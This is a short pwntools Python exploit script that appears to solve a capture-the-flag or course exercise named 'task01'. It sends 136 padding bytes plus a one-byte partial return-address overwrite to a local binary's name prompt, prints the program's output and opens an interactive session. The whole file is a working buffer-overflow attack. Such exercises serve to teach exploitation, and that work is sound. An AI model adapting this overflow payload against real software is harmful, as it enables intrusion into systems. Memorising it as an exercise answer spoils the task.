from pwn import *


io = process("./task01")
io.recvuntil("What is your name?")
password = b'A' * 136 + p8(0x40)
io.send(password)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break

io.interactive()